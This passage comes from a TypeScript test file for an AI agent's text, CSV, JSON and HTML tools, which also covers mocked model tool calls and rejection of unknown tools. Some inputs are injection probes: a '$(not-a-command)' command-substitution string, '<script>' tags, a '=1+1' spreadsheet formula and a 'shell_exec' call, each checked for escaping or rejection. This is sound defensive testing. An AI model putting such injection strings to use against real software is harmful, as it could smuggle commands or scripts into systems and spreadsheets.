    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-html-escape",content:'<b a="x">'})).toBe("&lt;b a=&quot;x&quot;&gt;");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-html-unescape",content:"&lt;b&gt;Hi&amp;bye&lt;/b&gt;"})).toBe("<b>Hi&bye</b>");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-mentions",content:"@Nolane @Nolane user@example.com @helper"})).toBe("@Nolane\n@helper");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-hex-colors",content:"color #abc and #AABBCC #abc"})).toBe("#ABC\n#AABBCC");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-phones",content:"Call +84 912 345 678"})).toBe("+84 912 345 678");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-dedupe-lines",content:"One\nTwo\none\n"})).toBe("One\nTwo\n");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-count-report",content:"one two\nthree"})).toContain("Words: 3");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-quote-lines",content:"one\ntwo"})).toBe('"one"\n"two"');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-unquote-lines",content:'"one"\n"two"'})).toBe("one\ntwo");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-transpose",content:"a,b\n1,2\n3,4"})).toBe("a,1,3\nb,2,4");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-sort-rows",content:"name,score\nB,2\nA,1"})).toBe("name,score\nA,1\nB,2");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-dedupe-rows",content:"name,score\nA,1\na,1\nB,2"})).toBe("name,score\nA,1\nB,2");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-to-xml",content:'name,note\nAn,"<script>"'})).toContain("&lt;script&gt;");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-to-html",content:'name,note\nAn,"<script>"'})).toContain("&lt;script&gt;");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-sort-array",content:'[{"z":1},{"a":2}]'})).toBe('[\n  {\n    "a": 2\n  },\n  {\n    "z": 1\n  }\n]');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-remove-nulls",content:'{"a":null,"b":[1,null,{"x":null,"y":2}] }'})).toBe('{\n  "b": [\n    1,\n    {\n      "y": 2\n    }\n  ]\n}');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-to-html-table",content:'[{"name":"<script>","score":7}]'})).toContain("&lt;script&gt;");
  });

  it("runs third-wave AI cleanup, extraction, CSV and JSON processors", async () => {
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-collapse-whitespace",content:" a   b  \n c "})).toBe("a b\nc");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-remove-punctuation",content:"hello,world! nice-day"})).toBe("hello world nice day");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-to-ascii",content:"Đặng café"})).toBe("Dang cafe");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-html-escape",content:'<b a="x">'})).toBe("&lt;b a=&quot;x&quot;&gt;");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-html-unescape",content:"&lt;b&gt;Hi&amp;bye&lt;/b&gt;"})).toBe("<b>Hi&bye</b>");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-mentions",content:"@Nolane @Nolane user@example.com @helper"})).toBe("@Nolane\n@helper");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-hex-colors",content:"color #abc and #AABBCC #abc"})).toBe("#ABC\n#AABBCC");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-phones",content:"Call +84 912 345 678"})).toBe("+84 912 345 678");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-dedupe-lines",content:"One\nTwo\none\n"})).toBe("One\nTwo\n");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-count-report",content:"one two\nthree"})).toContain("Words: 3");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-quote-lines",content:"one\ntwo"})).toBe('"one"\n"two"');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-unquote-lines",content:'"one"\n"two"'})).toBe("one\ntwo");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-transpose",content:"a,b\n1,2\n3,4"})).toBe("a,1,3\nb,2,4");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-sort-rows",content:"name,score\nB,2\nA,1"})).toBe("name,score\nA,1\nB,2");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-dedupe-rows",content:"name,score\nA,1\na,1\nB,2"})).toBe("name,score\nA,1\nB,2");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-to-xml",content:'name,note\nAn,"<script>"'})).toContain("&lt;script&gt;");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-to-html",content:'name,note\nAn,"<script>"'})).toContain("&lt;script&gt;");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-sort-array",content:'[{"z":1},{"a":2}]'})).toBe('[\n  {\n    "a": 2\n  },\n  {\n    "z": 1\n  }\n]');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-remove-nulls",content:'{"a":null,"b":[1,null,{"x":null,"y":2}] }'})).toBe('{\n  "b": [\n    1,\n    {\n      "y": 2\n    }\n  ]\n}');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-to-html-table",content:'[{"name":"<script>","score":7}]'})).toContain("&lt;script&gt;");
  });

  it("runs fourth-wave naming, Markdown, JSON and CSV processors", async () => {
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-pascal-case",content:"hello world\nXML parser"})).toBe("HelloWorld\nXmlParser");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-constant-case",content:"hello world"})).toBe("HELLO_WORLD");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-dot-case",content:"hello world"})).toBe("hello.world");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-initials",content:"Open AI\nNolane Search"})).toBe("OA\nNS");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-normalize-unicode",content:"Cafe\u0301"})).toBe("Café");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-remove-control-chars",content:"A\u0000B\nC"})).toBe("AB\nC");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-remove-duplicate-words",content:"One one two TWO three"})).toBe("One two three");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-markdown-links",content:'[Site](https://example.com "Example")'})).toContain('"url":"https://example.com"');
    const fence=String.fromCharCode(96).repeat(3);
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-markdown-headings",content:"# Title\n"+fence+"\n# Hidden\n"+fence+"\n## Sub"})).toContain('"text":"Sub"');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-quotes",content:'Say "hello" and “world”'})).toBe("hello\nworld");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-paragraph-report",content:"one two\n\nthree"})).toContain("Paragraphs: 2");

    const flat=await executeAgentTool(env,"process_text_content",{tool_id:"json-flatten",content:'{"a":{"b":1,"x/y":2},"items":[1,2]}'}); 
    expect(flat).toContain('"/a/b": 1');
    expect(flat).toContain('"/a/x~1y": 2');
    const restored=await executeAgentTool(env,"process_text_content",{tool_id:"json-unflatten",content:flat});
    expect(JSON.parse(restored)).toEqual({a:{b:1,"x/y":2},items:[1,2]});
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-keys-report",content:'{"a":{"b":1},"items":[{"c":2}]}'})).toContain("$.items[0].c");

    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-remove-empty-rows",content:"name,score\nAn,7\n,\nB,8"})).toBe("name,score\nAn,7\nB,8");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-add-row-numbers",content:"name,score\nAn,7"})).toBe("_row_number,name,score\n1,An,7");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-column-stats",content:"name,score\nAn,7\nB,8"})).toContain('"numeric":2');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-normalize-headers",content:"First Name,Score,First Name\nAn,7,B"})).toContain("first_name,score,first_name_2");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-to-jsonl",content:"name,score\nAn,7\nB,8"})).toBe('{"name":"An","score":"7"}\n{"name":"B","score":"8"}');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"jsonl-to-csv",content:'{"name":"An","score":7}\n{"name":"B","extra":true}'})).toBe("name,score,extra\nAn,7,\nB,,true");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"jsonl-to-csv",content:'{"amount":-7,"formula":"=1+1"}'})).toBe("amount,formula\n-7,'=1+1");
  });

  it("runs fifth-wave text, HTML, JSON and CSV processors", async () => {
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-indent-lines",content:"alpha\n\nbeta"})).toBe("    alpha\n\n    beta");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-unindent-lines",content:"    alpha\n        beta\n    gamma"})).toBe("alpha\n    beta\ngamma");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-dedupe-paragraphs",content:"One paragraph.\n\none   paragraph.\n\nSecond."})).toBe("One paragraph.\n\nSecond.");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-tokenize-words",content:"Hello, world! I'm here."})).toBe("Hello\nworld\nI'm\nhere");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-sentence-report",content:"One sentence. Two words here!"})).toContain("Sentences (heuristic): 2");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-line-length-report",content:"a\nlongest line\nbb"})).toContain("Longest line: 12");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-normalize-newlines",content:"a\r\nb\rc"})).toBe("a\nb\nc");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-remove-zero-width",content:"a\u200bb\u200dc\ufeff"})).toBe("abc");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-file-paths",content:"See /var/log/app.log and /home/user/a.txt"})).toContain("/var/log/app.log");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-sort-words",content:"pear Apple banana"})).toBe("Apple\nbanana\npear");

    const html='<html><head><title>Example &amp; Demo</title></head><body><a href="https://example.com" title="Home">Example</a><img src="/img/a.png" alt="A"></body></html>';
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"html-extract-links",content:html})).toContain('"url":"https://example.com"');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"html-extract-images",content:html})).toContain("/img/a.png");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"html-extract-title",content:html})).toBe("Example & Demo\n");

    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-to-xml",content:'{"person":{"@id":"7","name":"An","tags":["a","b"]}}'})).toContain('<person id="7">');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-type-report",content:'{"a":[1,true,null]}'})).toContain("Maximum depth: 2");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-escape-string",content:'hello "world"'})).toBe('"hello \\"world\\""');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-unescape-string",content:'"hello \\"world\\""'})).toBe('hello "world"');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-unique-values",content:"Name,Team\nAn,A\nAn,B\nBình,A"})).toContain('"count":2');
  });

  it("runs fifth-wave text, Markdown, CSV and JSON convenience tools through AI", async () => {
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-sentence-case",content:"hello world. HELLO AGAIN!"})).toBe("Hello world. Hello again!");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-normalize-quotes",content:"“hello” ‘world’"})).toBe('"hello" \'world\'');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-normalize-dashes",content:"a–b — c"})).toBe("a-b - c");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-reverse-word-order",content:"one two three"})).toBe("three two one");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-words",content:"One one TWO"})).toBe("One\nTWO");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-sentences",content:"One. Two! Three?"})).toBe("One.\nTwo!\nThree?");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-dedupe-sentences",content:"One. two! ONE."})).toBe("One. two!");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-remove-markdown-formatting",content:"# Heading\n- **bold** and [link](https://example.com)"})).toContain("Heading\nbold and link");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-markdown-toc",content:"# First\n## Second"})).toBe("- [First](#first)\n  - [Second](#second)");
    const fence=String.fromCharCode(96).repeat(3);
    const blocks=String(await executeAgentTool(env,"process_text_content",{tool_id:"text-markdown-code-blocks",content:fence+"python\nprint(1)\n"+fence}));
    expect(blocks).toContain('"language":"python"');
    expect(blocks).toContain("print(1)");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-markdown-table-extract",content:"| Name | Score |\n| --- | --- |\n| An | 7 |"})).toBe("Name,Score\nAn,7");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-numbered-lists",content:"1. First\n2) Second\n- third"})).toBe("First\nSecond");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-join-hyphenated-lines",content:"inter-\nnational"})).toBe("international");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-strip-bom",content:"\uFEFFHello"})).toBe("Hello");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-normalize-paragraph-spacing",content:"one\n\n\n two"})).toBe("one\n\n two");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-schema-infer",content:"Age,Active\n17,true\n18,false"})).toContain('"type":"integer"');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-duplicates-report",content:"a,b\n1,x\n2,y\n1,x\n1,x"})).toContain("Duplicate occurrences: 2");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-sample-rows",content:"a,b\n1,2\n3,4"})).toBe("a,b\n1,2\n3,4");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-array-stats",content:'[{"a":1},null,"x",true]'})).toContain("object: 1");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-canonicalize",content:'{"z":1,"a":{"d":2,"b":3}}'})).toBe('{"a":{"b":3,"d":2},"z":1}');
  });

  it("runs sixth-wave Markdown, secret, extraction, JSON and CSV helpers", async () => {
    const frontmatter="---\ntitle: Demo\n---\n# Hello\n\n![Logo](https://example.com/a.png \"Brand\")";
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-strip-markdown-frontmatter",content:frontmatter})).toBe("# Hello\n\n![Logo](https://example.com/a.png \"Brand\")");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-markdown-images",content:'![Logo](https://example.com/a.png "Brand")'})).toContain('"url":"https://example.com/a.png"');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-markdown-to-plain",content:"# Hello\n\n- **World** [link](https://example.com)"})).toBe("Hello\n\nWorld link");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-todo-comments",content:"# TODO: finish\n// FIXME: repair"})).toBe("1\tTODO\tfinish\n2\tFIXME\trepair");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-sort-unique-words",content:"Pear apple PEAR banana"})).toBe("apple\nbanana\nPear");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-word-to-lines",content:"one  two\nthree"})).toBe("one\ntwo\nthree");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-join-lines",content:" one \n\n two\t\n three"})).toBe("one two three");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-domains",content:"https://sub.example.com mail user@example.net and foo.org"})).toBe("sub.example.com\nfoo.org");
    const uuid="550e8400-e29b-41d4-a716-446655440000";
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-uuids",content:uuid+" "+uuid})).toBe(uuid);
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-semver",content:"v1.2.3 2.0.0-rc.1"})).toBe("v1.2.3\n2.0.0-rc.1");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-ipv6",content:"2001:db8::1 and bad::gg"})).toBe("2001:db8::1");
    const secret="ghp_"+"A".repeat(36);
    const redacted=String(await executeAgentTool(env,"process_text_content",{tool_id:"text-redact-secrets",content:"GITHUB_TOKEN="+secret+"\napi_key='abc123'"}));
    expect(redacted).not.toContain(secret);
    expect(redacted).not.toContain("abc123");
    expect(redacted).toContain("[REDACTED");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-comment-lines",content:"// comment\nconst a=1\n# config"})).toBe("1\t// comment\n3\t# config");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-tabs-to-spaces",content:"a\tb\n\tc"})).toBe("a   b\n    c");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-escape-regex",content:"a+b(c)"})).toBe("a\\+b\\(c\\)");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-unescape-regex",content:"a\\+b\\(c\\)"})).toBe("a+b(c)");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-merge-objects",content:'[{"a":1},{"a":2,"b":3}]'})).toBe('{\n  "a": 2,\n  "b": 3\n}');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-array-dedupe",content:'[{"a":1,"b":2},{"b":2,"a":1},null,null,"x"]'})).toBe('[\n  {\n    "a": 1,\n    "b": 2\n  },\n  null,\n  "x"\n]');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-array-to-lines",content:'["one","two"]'})).toBe("one\ntwo");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-trim-cells",content:" Name ,Score \n An , 7 "})).toBe("Name,Score\nAn,7");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-remove-empty-columns",content:"Name,Unused,Score\nAn,,7\nB,,8"})).toBe("Name,Score\nAn,7\nB,8");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-empty-cell-report",content:"Name,Score\nAn,7\nB,"})).toContain('"empty":1');
  });

  it("routes AI tool-call translation through the configured translation model", async () => {
    const fetchMock=vi.fn(async (_input:RequestInfo|URL,init?:RequestInit)=>{
      const body=JSON.parse(String(init?.body)) as {messages:Array<{role:string;content:string}>};
      expect(body.messages[0]?.content).toContain("professional translator");
      expect(body.messages[1]?.content).toContain("Hello world");
      return new Response(JSON.stringify({
        choices:[{message:{content:"Bonjour le monde"}}],
      }),{status:200});
    });
    vi.stubGlobal("fetch",fetchMock);
    const config={
      strategy:"priority",
      providers:[{
        id:"agent-translation",
        protocol:"openai-compatible",
        baseUrl:"https://api.example.ai/v1",
        apiKey:"agent-translation-secret",
        models:[{id:"translation-model",tasks:["translation"]}],
      }],
    };
    const result=await executeAgentTool({
      ...env,AI_ROUTER_CONFIG:JSON.stringify(config),
    } as Env,"process_text_content",{
      tool_id:"text-translate",target_language:"French",content:"Hello world",
    });
    expect(result).toBe("Bonjour le monde");
    expect(fetchMock).toHaveBeenCalledTimes(1);
  });

  it("cleans CSV safely and profiles columns", async () => {
    const source = "name,score\n A , 4 \nA,4\nB,";
    const cleaned = await executeAgentTool(env, "process_text_content", {tool_id:"csv-clean",content:source});
    expect(cleaned).toBe("name,score\nA,4\nB,");
    const profile = await executeAgentTool(env, "process_text_content", {tool_id:"csv-profile",content:source});
    expect(profile).toContain("Rows: 3");
    expect(profile).toContain("score: missing 1/3");
  });

  it("converts JSON arrays to CSV and extracts only visible HTML text", async () => {
    const csv = await executeAgentTool(env, "process_text_content", {tool_id:"json-to-csv",content:'[{"name":"An","score":7},{"name":"Bình","score":8}]'});
    expect(csv).toBe("name,score\nAn,7\nBình,8");
    const html = await executeAgentTool(env, "process_text_content", {tool_id:"html-text",content:"<script>secret()</script><h1>Hello &amp; hi</h1><p>World</p>"});
    expect(html).toBe("Hello & hi\nWorld");
  });

  it("normalizes subtitle text and computes a SHA-256 fingerprint", async () => {
    const subtitle = await executeAgentTool(env, "process_text_content", {tool_id:"subtitle-text",content:"WEBVTT\n\n00:00:01.000 --> 00:00:02.000\n<v Speaker>Hello</v>"});
    expect(subtitle).toBe("Hello");
    const hash = await executeAgentTool(env, "hash_text", {content:"hello"});
    expect(hash).toMatch(/^SHA-256: [a-f0-9]{64}$/);
  });

  it("runs native agent function calls and returns the final answer with tool provenance", async () => {
    const requests: Array<Record<string, unknown>> = [];
    const fetchMock = vi.fn(async (_input: RequestInfo | URL, init?: RequestInit) => {
      const body = JSON.parse(String(init?.body)) as Record<string, unknown>;
      requests.push(body);
      if (requests.length === 1) {
        return new Response(JSON.stringify({
          choices: [{ message: { content: null, tool_calls: [
            { id: "call_catalog", type: "function", function: { name: "list_nolane_tools", arguments: JSON.stringify({ category: "document", query: "pdf-split", limit: 20 }) } },
          ] } }],
        }), { status: 200 });
      }
      const messages = body.messages as Array<{role:string;content:string}>;
      const toolResult = messages.find(message => message.role === "tool")?.content || "";
      expect(toolResult).toContain("pdf-split");
      expect(toolResult).toContain('"total":1');
      expect(toolResult).toContain('"nextOffset":null');
      return new Response(JSON.stringify({
        choices: [{ message: { content: "Nolane có catalog công cụ nâng cao." } }],
      }), { status: 200 });
    });
    vi.stubGlobal("fetch", fetchMock);
    const config = {
      strategy: "priority",
      providers: [{ id: "agent-test", protocol: "openai-compatible", baseUrl: "https://api.example.ai/v1",
        apiKey: "agent-test-secret", models: ["agent-model"] }],
    };
    const result = await runAgentLoop({
      ...env, AI_ROUTER_CONFIG: JSON.stringify(config),
    } as Env, {
      task: "chat", messages: [{role:"user",content:"Hãy liệt kê các công cụ dữ liệu."}],
    });
    expect(result.completion.text).toContain("Nolane có catalog");
    expect(result.toolsUsed).toEqual(["list_nolane_tools"]);
    expect(requests).toHaveLength(2);
    expect(requests[0]?.tool_choice).toBe("auto");
  });

  it("lets the Telegram agent arm file processing through a real model tool call", async () => {
    const requests: Array<Record<string, unknown>> = [];
    const fetchMock = vi.fn(async (_input: RequestInfo | URL, init?: RequestInit) => {
      const body = JSON.parse(String(init?.body)) as Record<string, unknown>;
      requests.push(body);
      if (requests.length === 1) {
        return new Response(JSON.stringify({
          choices: [{ message: { content: null, tool_calls: [
            { id: "call_prepare", type: "function", function: {
              name: "prepare_file_processing",
              arguments: JSON.stringify({goal:"Extract all text and tables from my PDF"}),
            } },
          ] } }],
        }), { status: 200 });
      }
      const messages = body.messages as Array<{role:string;content:string}>;
      expect(messages.some(message => message.role === "tool" && message.content.includes("upload session")))
        .toBe(true);
      return new Response(JSON.stringify({
        choices: [{ message: { content: "Đã sẵn sàng, hãy gửi PDF trong chat riêng Telegram." } }],
      }), { status: 200 });
    });
    vi.stubGlobal("fetch", fetchMock);
    const config = {
      strategy: "priority",
      providers: [{ id: "agent-file-test", protocol: "openai-compatible", baseUrl: "https://api.example.ai/v1",
        apiKey: "agent-file-test-secret", models: ["agent-model"] }],
    };
    const prepareFileProcessing = vi.fn(async (_goal: string) => "A private Telegram upload session is ready; no file has been processed yet.");
    const context: AgentToolContext = { canPrepareFileProcessing: true, prepareFileProcessing };
    const result = await runAgentLoop({
      ...env, AI_ROUTER_CONFIG: JSON.stringify(config),
    } as Env, {
      task: "chat", messages: [{role:"user",content:"I want you to extract the text and tables from my PDF."}],
    }, { context });
    const firstTools = requests[0]?.tools as Array<{function:{name:string}}>;
    expect(firstTools.some(tool => tool.function.name === "prepare_file_processing")).toBe(true);
    expect(prepareFileProcessing).toHaveBeenCalledWith("Extract all text and tables from my PDF");
    expect(result.toolsUsed).toEqual(["prepare_file_processing"]);
    expect(result.completion.text).toContain("Đã sẵn sàng");
  });

  it("rejects arbitrary tools, invalid arguments and oversized content", async () => {
    await expect(executeAgentTool(env,"shell_exec",{command:"echo unsafe"})).rejects.toThrow("Unknown");
    await expect(executeAgentTool(env,"process_text_content",{tool_id:"code-check",content:"print(1)"})).rejects.toThrow("not enabled");
    await expect(executeAgentTool(env,"process_text_content",{tool_id:"json-format",content:"x".repeat(40_001)})).rejects.toThrow();
  });

  it("executes fourth-wave naming, Markdown, JSON Pointer and CSV/JSONL utilities directly", async () => {
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-pascal-case",content:"hello world\nXML parser"})).toBe("HelloWorld\nXmlParser");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-constant-case",content:"hello world"})).toBe("HELLO_WORLD");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-initials",content:"Open AI\nNolane Search"})).toBe("OA\nNS");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-normalize-unicode",content:"Cafe\u0301"})).toBe("Café");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-remove-control-chars",content:"A\u0000B\nC"})).toBe("AB\nC");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-remove-duplicate-words",content:"One one two TWO three"})).toBe("One two three");
    const markdownLinks=await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-markdown-links",content:'[Site](https://example.com "Example")'});
    expect(JSON.parse(markdownLinks.split("\n")[0]||"{}")).toEqual({text:"Site",url:"https://example.com",title:"Example"});
    const fence=String.fromCharCode(96).repeat(3);
    const headings=await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-markdown-headings",content:"# Title\n"+fence+"\n# Hidden\n"+fence+"\n## Sub"});
    expect(headings).not.toContain("Hidden");
    expect(headings).toContain('"text":"Sub"');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-quotes",content:'Say "hello" and “world”'})).toBe("hello\nworld");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-paragraph-report",content:"one two\n\nthree"})).toContain("Paragraphs: 2");

    const flat=await executeAgentTool(env,"process_text_content",{tool_id:"json-flatten",content:'{"a":{"b":1,"x/y":2},"items":[1,2],"empty":{}}'});
    expect(JSON.parse(flat)).toEqual({"/a/b":1,"/a/x~1y":2,"/items":[1,2],"/empty":{}});
    const restored=await executeAgentTool(env,"process_text_content",{tool_id:"json-unflatten",content:flat});
    expect(JSON.parse(restored)).toEqual({a:{b:1,"x/y":2},items:[1,2],empty:{}});
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"json-keys-report",content:'{"a":{"b":1},"items":[{"c":2}]}'})).toContain("$.items[0].c");
    await expect(executeAgentTool(env,"process_text_content",{tool_id:"json-unflatten",content:'{"/a":null,"/a/b":2}'})).rejects.toThrow("Conflicting JSON Pointer paths");

    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-remove-empty-rows",content:"name,score\nAn,7\n,\nB,8"})).toBe("name,score\nAn,7\nB,8");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-add-row-numbers",content:"name,score\nAn,7"})).toBe("_row_number,name,score\n1,An,7");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-column-stats",content:"name,score\nAn,7\nB,8"})).toContain('"numeric":2');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-normalize-headers",content:"First Name,Score,First Name\nAn,7,B"})).toContain("first_name,score,first_name_2");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"csv-to-jsonl",content:"name,score\nAn,7\nB,8"})).toBe('{"name":"An","score":"7"}\n{"name":"B","score":"8"}');
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"jsonl-to-csv",content:'{"name":"An","score":7}\n{"name":"B","extra":true}'})).toBe("name,score,extra\nAn,7,\nB,,true");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"jsonl-to-csv",content:'{"amount":-7,"formula":"=1+1"}'})).toBe("amount,formula\n-7,'=1+1");
  });



  it("runs Wave 7 processors via bounded AI function calls", async () => {
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-mac-addresses",content:"aa-bb-cc-dd-ee-ff AA:BB:CC:DD:EE:FF"})).toBe("AA:BB:CC:DD:EE:FF\n");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-port-numbers",content:"port=80 localhost:3000 https://a.test:443/ port=70000"})).toBe("80\n3000\n443\n");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-normalize-path-separators",content:"C:\\Users\\Ada\\project"})).toBe("C:/Users/Ada/project");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-extract-file-extensions",content:"a.txt b.README.md c.tar.gz"})).toBe("txt\nmd\ngz\n");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-escape-shell-argument",content:"a'b $(not-a-command)"})).toBe("'a'\"'\"'b $(not-a-command)'");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-sort-unique-lines",content:"zeta\nAlpha\nalpha\nbeta\n"})).toBe("Alpha\nbeta\nzeta\n");
    expect(await executeAgentTool(env,"process_text_content",{tool_id:"text-normalize-unicode-nfkc",content:"ＡＢＣ ① ﬁ"})).toBe("ABC 1 fi");

    const csv=`Name,Name,Note\nAn,one,"O'Reilly"\n,,\nB,two,"# heading"`;
    const sql=await executeAgentTool(env,"process_text_content",{tool_id:"csv-to-sql-inserts",content:csv});
    expect(sql).toContain('INSERT INTO "records" ("Name", "Name_2", "Note")');
    expect(sql).toContain("'O''Reilly'");
    const yaml=await executeAgentTool(env,"process_text_content",{tool_id:"csv-to-yaml",content:"name,flag\nAn,true"});
    expect(yaml).toContain('"name": "An"');
    expect(yaml).toContain('"flag": "true"');
